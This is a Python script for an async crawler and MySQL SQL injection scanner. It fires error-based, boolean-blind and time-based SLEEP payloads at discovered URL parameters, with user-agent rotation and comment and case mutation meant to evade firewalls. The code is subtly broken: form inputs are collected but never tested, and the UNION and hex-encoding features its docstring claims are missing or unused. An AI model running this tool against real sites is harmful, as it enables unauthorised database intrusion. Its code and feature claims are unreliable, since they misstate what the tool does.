#!/usr/bin/env python3
"""
async_mysql_sqli_scanner.py
Async crawler + MySQL-only SQLi scanner.

Features:
- Async crawl of same-domain pages with depth control
- Discover GET parameters and POST forms
- Test error-based, boolean-based, time-based (SLEEP), UNION-based SQLi
- Simple WAF-evasion (inline comments, hex-encoding)
- Concurrency with asyncio semaphores
- JSON & CSV output

Usage:
    python async_mysql_sqli_scanner.py --start-url http://localhost:8000 --max-depth 2 --concurrency 10
"""

import asyncio, aiohttp, argparse, json, csv, random, re, time
from urllib.parse import urlparse, urljoin, parse_qs

# -------------------------
# Config
# -------------------------
DEFAULT_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/114.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/14.0 Safari/605.1.15"
]

PAYLOADS = {
    "error": ["'", "\"'"],
    "boolean_true": [" AND 1=1", "\" AND 1=1 -- "],
    "boolean_false": [" AND 1=2", "\" AND 1=2 -- "],
    "time": [" AND IF(1=1, SLEEP({delay}),0)-- ", " AND IF(1=2, SLEEP({delay}),0)-- "],
    "union": [" UNION SELECT {cols} -- "]
}

MYSQL_ERRORS = [
    re.compile(r"You have an error in your SQL syntax", re.I),
    re.compile(r"mysql_fetch_assoc\(", re.I),
    re.compile(r"Warning: mysql_", re.I)
]

# -------------------------
# Payload mutation
# -------------------------
def mutate_payload(payload):
    muts = [payload, payload.replace("UNION", "UN/**/ION").replace("union","un/**/ion")]
    muts.append(''.join([c.upper() if i%2==0 else c for i,c in enumerate(payload)]))
    return list(dict.fromkeys(muts))

# -------------------------
# Scanner class
# -------------------------
class AsyncSQLiScanner:
    def __init__(self, start_url, max_depth=2, concurrency=5, delay=0.3, timeout=10, user_agents=None):
        self.start_url = start_url.rstrip('/')
        self.domain = urlparse(start_url).netloc
        self.scheme = urlparse(start_url).scheme
        self.max_depth = max_depth
        self.visited = set()
        self.to_visit = [(start_url, 0)]
        self.semaphore = asyncio.Semaphore(concurrency)
        self.delay = delay
        self.timeout = timeout
        self.user_agents = user_agents or DEFAULT_UA
        self.results = []

    async def fetch(self, session, url, method="GET", data=None):
        headers = {"User-Agent": random.choice(self.user_agents)}
        try:
            async with self.semaphore:
                if method.upper() == "GET":
                    async with session.get(url, headers=headers, timeout=self.timeout) as resp:
                        text = await resp.text()
                        return resp.status, text
                else:
                    async with session.post(url, headers=headers, data=data, timeout=self.timeout) as resp:
                        text = await resp.text()
                        return resp.status, text
        except Exception:
            return None, ""

    async def crawl(self):
        async with aiohttp.ClientSession() as session:
            while self.to_visit:
                url, depth = self.to_visit.pop(0)
                if url in self.visited or depth > self.max_depth:
                    continue
                self.visited.add(url)
                status, text = await self.fetch(session, url)
                await asyncio.sleep(self.delay)
                if "text/html" in (str(status) + str(text)) and text:
                    await self.extract_links_forms(session, text, url, depth)

    async def extract_links_forms(self, session, html, base_url, depth):
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(html, "html.parser")
        # A tags
        for a in soup.find_all('a', href=True):
            href = a['href']
            if href.startswith('javascript:') or href.startswith('mailto:'):
                continue
            absolute = urljoin(base_url, href)
            parsed = urlparse(absolute)
            if parsed.netloc == self.domain:
                normalized = parsed._replace(fragment='').geturl()
                if normalized not in self.visited:
                    self.to_visit.append((normalized, depth+1))
        # forms
        for form in soup.find_all('form'):
            action = form.get('action') or base_url
            method = (form.get('method') or "get").upper()
            absolute = urljoin(base_url, action)
            inputs = {}
            for inp in form.find_all(['input','textarea','select']):
                name = inp.get('name')
                if name:
                    inputs[name] = inp.get('value') or 'test'
            if absolute not in self.visited:
                self.to_visit.append((absolute, depth+1))

    async def discover_targets(self):
        targets = []
        for url in self.visited:
            parsed = urlparse(url)
            qs = parsed.query
            if qs:
                params = {k:v[0] if isinstance(v,list) else v for k,v in parse_qs(qs).items()}
                clean_url = parsed._replace(query='').geturl()
                targets.append({"type":"GET","url":clean_url,"params":params})
        return targets

    async def test_target(self, session, target):
        base_type = target['type']
        base_url = target['url']
        params = target['params'].copy()
        status, baseline_text = await self.fetch(session, base_url, method=base_type, data=params if base_type=="POST" else None)
        baseline_len = len(baseline_text)

        def record(tech, param, payload, evidence=""):
            entry = {"url": base_url,"type":base_type,"param":param,"technique":tech,"payload":payload,"evidence":evidence}
            self.results.append(entry)
            print(f"[!] VULN {tech}: {base_url} param={param} payload={payload}")

        # Error-based
        for p in list(params.keys()):
            original = params[p]
            for pay in PAYLOADS['error']:
                for mp in mutate_payload(pay):
                    params[p] = original + mp
                    _, txt = await self.fetch(session, base_url, method=base_type, data=params if base_type=="POST" else None)
                    for pat in MYSQL_ERRORS:
                        if pat.search(txt):
                            record("error-based", p, mp, pat.pattern)
                    params[p] = original

        # Boolean-based (blind)
        for p in list(params.keys()):
            orig = params[p]
            t_payload = mutate_payload(PAYLOADS['boolean_true'][0])[0]
            f_payload = mutate_payload(PAYLOADS['boolean_false'][0])[0]
            params[p] = orig + t_payload
            _, t_resp = await self.fetch(session, base_url, method=base_type, data=params if base_type=="POST" else None)
            params[p] = orig + f_payload
            _, f_resp = await self.fetch(session, base_url, method=base_type, data=params if base_type=="POST" else None)
            params[p] = orig
            if abs(len(t_resp)-len(f_resp))>max(50,0.02*baseline_len):
                record("boolean-blind", p, f"{t_payload}/{f_payload}", evidence=f"len_t={len(t_resp)} len_f={len(f_resp)}")

        # Time-based (blind)
        delay_sec = 3
        for p in list(params.keys()):
            orig = params[p]
            pay_true = mutate_payload(PAYLOADS['time'][0].format(delay=delay_sec))[0]
            pay_false = mutate_payload(PAYLOADS['time'][1].format(delay=delay_sec))[0]
            params[p] = orig + pay_false
            start = time.time()
            await self.fetch(session, base_url, method=base_type, data=params if base_type=="POST" else None)
            t_false = time.time()-start
            params[p] = orig + pay_true
            start = time.time()
            await self.fetch(session, base_url, method=base_type, data=params if base_type=="POST" else None)
            t_true = time.time()-start
            params[p] = orig
            if t_true - t_false > delay_sec-1:
                record("time-blind", p, pay_true, evidence=f"t_true={t_true:.1f}s t_false={t_false:.1f}s")

    async def run(self):
        async with aiohttp.ClientSession() as session:
            await self.crawl()
            targets = await self.discover_targets()
            print(f"[+] {len(targets)} targets discovered")
            tasks = [self.test_target(session, t) for t in targets]
            await asyncio.gather(*tasks)

    def export_results(self, prefix="scan"):
        ts = int(time.time())
        json_path = f"{prefix}_{ts}.json"
        csv_path = f"{prefix}_{ts}.csv"
        with open(json_path,"w",encoding="utf-8") as f:
            json.dump(self.results,f,indent=2)
        keys = ["url","type","param","technique","payload","evidence"]
        with open(csv_path,"w",newline='',encoding="utf-8") as f:
            writer = csv.DictWriter(f,fieldnames=keys)
            writer.writeheader()
            for row in self.results:
                writer.writerow({k: row.get(k,"") for k in keys})
        print(f"[+] Exported {json_path} and {csv_path}")

# -------------------------
# CLI
# -------------------------
def parse_args():
    ap = argparse.ArgumentParser(description="Async MySQL-only crawler + SQLi scanner")
    ap.add_argument("--start-url", "-u", required=True)
    ap.add_argument("--max-depth", type=int, default=2)
    ap.add_argument("--concurrency", type=int, default=5)
    ap.add_argument("--delay", type=float, default=0.3)
    return ap.parse_args()

if __name__=="__main__":
    args = parse_args()
    scanner = AsyncSQLiScanner(start_url=args.start_url, max_depth=args.max_depth, concurrency=args.concurrency, delay=args.delay)
    asyncio.run(scanner.run())
    scanner.export_results()
